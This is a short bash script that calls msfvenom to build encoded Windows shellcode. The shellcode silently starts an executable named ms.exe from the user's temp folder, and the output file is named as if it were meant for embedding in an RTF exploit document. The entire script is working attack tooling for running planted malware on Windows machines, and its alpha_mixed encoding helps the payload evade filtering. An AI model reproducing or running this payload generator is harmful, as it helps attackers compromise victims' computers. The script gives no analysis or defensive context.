#!/bin/bash

exename='ms.exe'
cmd="cmd.exe /c start /b %userprofile%\\appdata\\local\\temp\\$exename"
out=rtf_winexec.bin

echo "using cmd: $cmd"
echo "writing to: $out"
echo

msfvenom "EXITFUNC=thread" "CMD=$cmd" -p windows/exec -a x86 -e x86/alpha_mixed --platform windows -o "$out"
